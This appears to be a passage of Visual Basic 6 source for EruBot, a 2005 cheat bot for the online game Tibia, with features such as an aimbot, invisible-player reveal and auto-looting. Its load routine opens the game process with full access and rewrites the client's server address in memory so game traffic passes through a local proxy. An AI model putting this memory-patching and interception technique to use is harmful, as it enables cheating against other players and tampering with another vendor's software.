VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BackColor       =   &H00800000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "EruBot"
   ClientHeight    =   9105
   ClientLeft      =   150
   ClientTop       =   840
   ClientWidth     =   6105
   ForeColor       =   &H00000000&
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   607
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   407
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox chkAimbot 
      BackColor       =   &H00000000&
      Caption         =   "Aimbot"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   6
      Top             =   120
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   0
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CheckBox chkLootWorms 
      BackColor       =   &H00800000&
      Caption         =   "Loot Worms"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   195
      Left            =   120
      TabIndex        =   24
      Top             =   2400
      Width           =   1695
   End
   Begin VB.CheckBox chkAutoAttack 
      BackColor       =   &H00000000&
      Caption         =   "Auto Attacker"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   4320
      Style           =   1  'Graphical
      TabIndex        =   23
      Top             =   120
      Width           =   1695
   End
   Begin VB.CheckBox chkExpBeep 
      BackColor       =   &H00800000&
      Caption         =   "Beep every 1%"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   195
      Left            =   120
      TabIndex        =   22
      Top             =   1560
      Value           =   1  'Checked
      Width           =   1695
   End
   Begin VB.Timer tmrRevealInvis 
      Enabled         =   0   'False
      Interval        =   3
      Left            =   6120
      Top             =   6000
   End
   Begin VB.CheckBox chkRevealInvis 
      BackColor       =   &H00000000&
      Caption         =   "Reveal Invis"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   21
      Top             =   2760
      Width           =   1695
   End
   Begin VB.Timer tmrStatus 
      Enabled         =   0   'False
      Interval        =   2
      Left            =   6120
      Top             =   3960
   End
   Begin VB.Timer tmrPing 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   3480
   End
   Begin VB.Timer tmrLight 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   3000
   End
   Begin VB.CheckBox chkLight 
      BackColor       =   &H00000000&
      Caption         =   "Light"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   20
      Top             =   600
      Width           =   1680
   End
   Begin VB.TextBox txtStatusMessages 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   7335
      Left            =   1920
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   13
      Top             =   1680
      Width           =   4095
   End
   Begin VB.CheckBox chkGrabber 
      BackColor       =   &H00000000&
      Caption         =   "Ammo Grabber"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   19
      Top             =   7680
      Width           =   1680
   End
   Begin MSComDlg.CommonDialog cdlgWav 
      Left            =   6120
      Top             =   4440
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DefaultExt      =   "wav"
      DialogTitle     =   "Select Wav file to play for alert function"
      FileName        =   "*.wav"
      Filter          =   "Wave Files, *.wav"
      InitDir         =   "app.path"
   End
   Begin VB.CheckBox chkAlertLogged 
      BackColor       =   &H00800000&
      Caption         =   "Alert if logged."
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   195
      Left            =   2160
      TabIndex        =   18
      Top             =   600
      Width           =   1695
   End
   Begin VB.Timer tmrLogOut 
      Enabled         =   0   'False
      Interval        =   200
      Left            =   6120
      Top             =   2520
   End
   Begin VB.CheckBox chkLogOut 
      BackColor       =   &H00000000&
      Caption         =   "Log ASAP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   2160
      Style           =   1  'Graphical
      TabIndex        =   17
      Top             =   120
      Width           =   1680
   End
   Begin VB.Timer tmrLooter 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   6120
      Top             =   2040
   End
   Begin VB.CheckBox chkLooter 
      BackColor       =   &H00000000&
      Caption         =   "Looter"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   16
      Top             =   1920
      Width           =   1695
   End
   Begin VB.CommandButton cmdClearLog 
      Caption         =   "Clear Log"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   4320
      TabIndex        =   15
      Top             =   960
      Width           =   1695
   End
   Begin VB.CheckBox chkOutfit 
      BackColor       =   &H00000000&
      Caption         =   "Outfit Changer"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   14
      Top             =   8160
      Width           =   1695
   End
   Begin VB.Timer tmrAlert 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6120
      Top             =   120
   End
   Begin VB.CheckBox chkAlert 
      BackColor       =   &H00000000&
      Caption         =   "Alert"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   2160
      Style           =   1  'Graphical
      TabIndex        =   12
      Top             =   960
      Width           =   1680
   End
   Begin VB.CheckBox chkIntruder 
      BackColor       =   &H00000000&
      Caption         =   "Intruder Reaction"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   10
      Top             =   5160
      Width           =   1680
   End
   Begin VB.CheckBox chkFisher 
      BackColor       =   &H00000000&
      Caption         =   "Fisher"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   9
      Top             =   7200
      Width           =   1680
   End
   Begin VB.Timer tmrManaFluid 
      Enabled         =   0   'False
      Interval        =   600
      Left            =   6120
      Top             =   1560
   End
   Begin VB.CheckBox chkMana 
      BackColor       =   &H00000000&
      Caption         =   "Fluid Till Full"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   8
      Top             =   8640
      Width           =   1695
   End
   Begin VB.CheckBox chkExpHour 
      BackColor       =   &H00000000&
      Caption         =   "Experience/Hour"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   7
      Top             =   1080
      Width           =   1695
   End
   Begin VB.Timer tmrExp 
      Enabled         =   0   'False
      Interval        =   3600
      Left            =   6120
      Top             =   600
   End
   Begin VB.CheckBox chkEatLog 
      BackColor       =   &H00800000&
      Caption         =   "Log if no food."
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   195
      Left            =   120
      TabIndex        =   5
      Top             =   6840
      Width           =   1695
   End
   Begin VB.Timer tmrEat 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   6120
      Top             =   1080
   End
   Begin VB.CheckBox chkRune 
      BackColor       =   &H00000000&
      Caption         =   "Rune Maker"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   3480
      Width           =   1680
   End
   Begin VB.CheckBox chkAttack 
      BackColor       =   &H00000000&
      Caption         =   "Attack Reaction"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   3
      Top             =   5640
      Width           =   1695
   End
   Begin VB.CheckBox chkHeal 
      BackColor       =   &H00000000&
      Caption         =   "Healer"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   2
      Top             =   4440
      Width           =   1695
   End
   Begin VB.CheckBox chkSpell 
      BackColor       =   &H00000000&
      Caption         =   "Spell Caster"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   1
      Top             =   3960
      Width           =   1680
   End
   Begin VB.CheckBox chkEat 
      BackColor       =   &H00000000&
      Caption         =   "Eater"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   0
      Top             =   6360
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock sckL2 
      Left            =   480
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckC 
      Left            =   960
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckL1 
      Left            =   1440
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckS 
      Left            =   1920
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdlgClient 
      Left            =   6120
      Top             =   4920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      CancelError     =   -1  'True
      DefaultExt      =   "exe"
      DialogTitle     =   "Locate tibia client"
      FileName        =   "*.exe"
      Filter          =   "Tibia.exe, *.exe"
      InitDir         =   "app.path"
   End
   Begin MSComDlg.CommonDialog cdlgSettings 
      Left            =   6120
      Top             =   5400
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      CancelError     =   -1  'True
      DefaultExt      =   "ebs"
      DialogTitle     =   "Load Settings"
      FileName        =   "*.ebs"
      Filter          =   "EruBot Settings, *.ebs"
      InitDir         =   "app.path"
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   1
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   2
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   3
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   4
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   5
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   6
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   7
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   8
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   9
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   10
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   11
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   12
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   13
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   14
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   15
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   16
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   17
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   18
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckMC 
      Index           =   19
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00C0C0C0&
      BorderStyle     =   0  'Transparent
      FillColor       =   &H0000C0C0&
      FillStyle       =   0  'Solid
      Height          =   1215
      Index           =   0
      Left            =   1920
      Top             =   120
      Width           =   135
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00C0C0C0&
      BorderStyle     =   0  'Transparent
      FillColor       =   &H0000C0C0&
      FillStyle       =   0  'Solid
      Height          =   135
      Index           =   5
      Left            =   120
      Top             =   3240
      Width           =   1695
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00C0C0C0&
      BorderStyle     =   0  'Transparent
      FillColor       =   &H0000C0C0&
      FillStyle       =   0  'Solid
      Height          =   135
      Index           =   3
      Left            =   120
      Top             =   6120
      Width           =   1695
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00C0C0C0&
      BorderStyle     =   0  'Transparent
      FillColor       =   &H0000C0C0&
      FillStyle       =   0  'Solid
      Height          =   135
      Index           =   2
      Left            =   120
      Top             =   4920
      Width           =   1695
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Status Messages"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   1920
      TabIndex        =   11
      Top             =   1440
      Width           =   4095
   End
   Begin VB.Menu mnuConfigure 
      Caption         =   "&Configure"
      Begin VB.Menu mnuActive 
         Caption         =   "&Active"
      End
      Begin VB.Menu mnuWavAlert 
         Caption         =   "Alert using .wav file"
      End
      Begin VB.Menu mnuDebug 
         Caption         =   "Debug"
      End
      Begin VB.Menu Dash1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuLoad 
         Caption         =   "Load Settings"
      End
      Begin VB.Menu mnuSave 
         Caption         =   "Save Settings"
      End
      Begin VB.Menu dash2 
         Caption         =   "-"
      End
      Begin VB.Menu mnuAimbot 
         Caption         =   "&Aimbot"
      End
      Begin VB.Menu mnuGrabber 
         Caption         =   "Ammo &Grabber"
      End
      Begin VB.Menu mnuAttack 
         Caption         =   "A&ttack Reaction"
      End
      Begin VB.Menu mnuAutoAttack 
         Caption         =   "Auto Attacker"
      End
      Begin VB.Menu mnuFish 
         Caption         =   "&Fisher"
      End
      Begin VB.Menu mnuHeal 
         Caption         =   "&Healer"
      End
      Begin VB.Menu mnuIntruder 
         Caption         =   "&Intruder Reaction"
      End
      Begin VB.Menu mnuLooter 
         Caption         =   "Looter"
      End
      Begin VB.Menu mnuLevelSpy 
         Caption         =   "Level Spy"
      End
      Begin VB.Menu mnuMageCrew 
         Caption         =   "Mage Crew"
      End
      Begin VB.Menu mnuOutfit 
         Caption         =   "Outfit Changer"
      End
      Begin VB.Menu mnuRune 
         Caption         =   "&Rune Maker"
      End
      Begin VB.Menu mnuScript 
         Caption         =   "Script"
      End
      Begin VB.Menu mnuSpell 
         Caption         =   "&Spell Caster"
      End
      Begin VB.Menu dash5 
         Caption         =   "-"
      End
      Begin VB.Menu mnuExit 
         Caption         =   "&Exit"
      End
   End
   Begin VB.Menu mnuFunctions 
      Caption         =   "&Functions"
      Begin VB.Menu mnuBroadcast 
         Caption         =   "&Broadcast PM"
      End
      Begin VB.Menu mnuOpenWav 
         Caption         =   "Select alert .wav file..."
      End
      Begin VB.Menu mnuTradeHotkey 
         Caption         =   "Modify trade hotkey"
      End
      Begin VB.Menu mnuForceLevel 
         Caption         =   "Force Level"
         Enabled         =   0   'False
      End
      Begin VB.Menu dash6 
         Caption         =   "-"
      End
      Begin VB.Menu mnuTestMemory 
         Caption         =   "Test memory read"
      End
      Begin VB.Menu mnuDecode 
         Caption         =   "Decode"
      End
      Begin VB.Menu mnuReceivePacket 
         Caption         =   "Force receive packet"
      End
   End
   Begin VB.Menu mnuNetwork 
      Caption         =   "&Change Server"
      Begin VB.Menu mnuChangeIP 
         Caption         =   "&IP"
      End
      Begin VB.Menu mnuChangePort 
         Caption         =   "&Port"
      End
   End
   Begin VB.Menu mnuHelp 
      Caption         =   "&Help"
      Begin VB.Menu mnuReadme 
         Caption         =   "&Readme"
         Enabled         =   0   'False
      End
      Begin VB.Menu mnuAbout 
         Caption         =   "&About"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub chkAimbot_Click()
  Valid
End Sub

Private Sub chkAimbot_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmAimbot.Show
End Sub

Private Sub chkAlert_Click()
    If chkAlert.Value = Unchecked Then
        playa "", SND_FLAG
    Else
        StartAlert
    End If
  Valid
End Sub

Private Sub chkAttack_Click()
  Valid
End Sub

Private Sub chkAttack_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmAttack.Show
End Sub

Private Sub chkExpHour_Click()
    Valid
End Sub

Private Sub chkAutoLog_Click()
  Valid
End Sub

Private Sub chkAutoAttack_Click()
    Valid
End Sub

Private Sub chkAutoAttack_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmAutoAttack.Show
End Sub

Private Sub chkEat_Click()
    Valid
End Sub

Private Sub chkExpHour_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then Exp_Stop: Exp_Start
End Sub

Private Sub chkFisher_Click()
  Valid
End Sub

Private Sub chkFisher_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmFisher.Show
End Sub

Private Sub chkGrabber_Click()
    Valid
End Sub

Private Sub chkGrabber_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmGrabber.Show
End Sub

Private Sub chkHeal_Click()
    Valid
End Sub

Private Sub chkHeal_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmHeal.Show
End Sub

Private Sub chkIntruder_Click()
  Valid
End Sub

Private Sub chkIntruder_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmIntruder.Show
End Sub

Private Sub chkLight_Click()
    Valid
End Sub

Private Sub chkLogOut_Click()
    Valid
End Sub

Private Sub chkLooter_Click()
    Valid
End Sub

Private Sub chkLooter_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmLooter.Show
End Sub

Private Sub chkOutfit_Click()
  Valid
End Sub

Private Sub chkOutfit_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmOutfit.Show
End Sub

Private Sub chkRevealInvis_Click()
    Valid
End Sub

Private Sub chkRune_Click()
    Valid
End Sub

Private Sub chkRune_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmRune.Show
End Sub

Private Sub chkMana_Click()
  Valid
End Sub

Private Sub chSpear_Click()
  Valid
End Sub

Private Sub chkSpell_Click()
  Valid
End Sub

Private Sub Command1_Click()
  frmStats.Show
End Sub

Private Sub chkSpell_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then frmSpell.Show
End Sub

Private Sub cmdClearLog_Click()
    txtStatusMessages = ""
End Sub

Private Sub LocateTibia()
    'MsgBox "Where is your Tibia Client located?", vbOKOnly + vbQuestion, "EruBot.dat not found"
    On Error GoTo Cancel
    Do
        cdlgClient.ShowOpen
    Loop Until dir(cdlgClient.FileName, vbNormal) <> ""
    
    tibFileName = cdlgClient.FileTitle
    tibDir = Mid(cdlgClient.FileName, 1, Len(cdlgClient.FileName) - Len(tibFileName) - 1)

    timeZone = CInt(InputBox("Enter your time zone relative to GMT", "Enter time zone", 11))
    Open App.Path & "\EruBot.dat" For Output As #1
    Write #1, tibDir, tibFileName
    Write #1, timeZone
    Close #1
    Exit Sub
Cancel:
    EndAll
End Sub

Private Sub Form_Load()
    Dim lngDeskTopHandle As Long
    Dim lngHand As Long
    Dim strName As String * 9
    Dim lngWindowCount As Long
    Dim lngTibia(20) As Long
    Dim C1 As Integer
    Dim Finished As Boolean
    
    If dir(App.Path & "\EruBot.dat", vbNormal) = "" Then LocateTibia
    
    Do
        Open App.Path & "\EruBot.dat" For Input As #1
        Input #1, tibDir, tibFileName
        Input #1, timeZone
        Close #1
        If dir(tibDir & "\" & tibFileName, vbNormal) = "" Then
            LocateTibia
        Else
            Finished = True
        End If
    Loop Until Finished
    lngDeskTopHandle = GetDesktopWindow()
    lngHand = GetWindow(lngDeskTopHandle, 5)
    Do While lngHand <> 0
        GetWindowText lngHand, strName, Len(strName)
        If strName = "Tibia   " & vbNullChar Then
            lngTibia(C1) = lngHand
            C1 = C1 + 1
        End If
        lngHand = GetWindow(lngHand, 2)
    Loop
    ShellExecute 0, "open", tibFileName, 0, tibDir, 3
    Pause 2000
    lngDeskTopHandle = GetDesktopWindow()
    lngHand = GetWindow(lngDeskTopHandle, 5)
    Finished = False
    Do While Finished = False
        If lngHand = 0 Then
            Pause 500
            lngDeskTopHandle = GetDesktopWindow()
            lngHand = GetWindow(lngDeskTopHandle, 5)
        End If
        GetWindowText lngHand, strName, Len(strName)
        If strName = "Tibia   " & vbNullChar Then
            Finished = True
            For C1 = 0 To 20
                If lngHand = lngTibia(C1) Then
                    Finished = False
                    Exit For
                End If
            Next
            If Finished = True Then tHWND = lngHand
        End If
        lngHand = GetWindow(lngHand, 2)
    Loop
    
    GetWindowThreadProcessId tHWND, processID
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, False, processID)
    
    sckL1.Listen
    sckL2.Listen
    StrToMem ADR_SERVER_IP, "localhost"
    StrToMem ADR_SERVER_IP + &H70, "localhost"
    StrToMem ADR_SERVER_IP + &HE0, "localhost"
    StrToMem ADR_SERVER_IP + &H150, "localhost"
    StrToMem ADR_SERVER_IP + &H1C0, "localhost"
    WriteMem ADR_SERVER_PORT, sckL1.LocalPort, 2
    WriteMem ADR_SERVER_PORT + &H70, sckL1.LocalPort, 2
    WriteMem ADR_SERVER_PORT + &HE0, sckL1.LocalPort, 2
    WriteMem ADR_SERVER_PORT + &H150, sckL1.LocalPort, 2
    WriteMem ADR_SERVER_PORT + &H1C0, sckL1.LocalPort, 2
    
    'ServerIP = "server.tibia.com"
    'ServerPort = 7171
    ServerIP = "tibia2.cipsoft.com"
    ServerPort = 7171
        
    LoadSettings App.Path & "\default.ebs"
    
    lastPing = GetTickCount
    tmrPing.Enabled = True
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Dim exitCode As Long
    GetExitCodeProcess processHandle, exitCode
    TerminateProcess processHandle, exitCode
    CloseHandle processHandle
    EndAll
End Sub

Private Sub mnuAbout_Click()
  MsgBox "EruBot version " & App.Major & "." & App.Minor & "." & App.Revision & vbCrLf _
    & "Stupidape 2005", vbInformation, "About EruBot..."
End Sub

Private Sub mnuActive_Click()
    If mnuActive.Checked = False Then
        mnuActive.Checked = True
    Else
        mnuActive.Checked = False
    End If
    Valid
End Sub

Private Sub mnuAimbot_Click()
  frmAimbot.Show
End Sub

Private Sub mnuAttack_Click()
    frmAttack.Show
End Sub

Private Sub mnuAutoAttack_Click()
    frmAutoAttack.Show
End Sub

Private Sub mnuBroadcast_Click()
    frmBroadcast.Show
End Sub

Private Sub mnuChangeIP_Click()
    Dim newIP As String
    newIP = InputBox("Enter new server IP", "Change IP", ServerIP)
    If newIP <> "" Then ServerIP = newIP
End Sub

Private Sub mnuChangePort_Click()
    Dim newPort As Integer
    On Error GoTo Noob
    newPort = CInt(InputBox("Enter new server port", "Change Port", ServerPort))
    If newPort > 0 Then ServerPort = newPort
Noob:
End Sub

Private Sub mnuDebug_Click()
  If mnuDebug.Checked = False Then
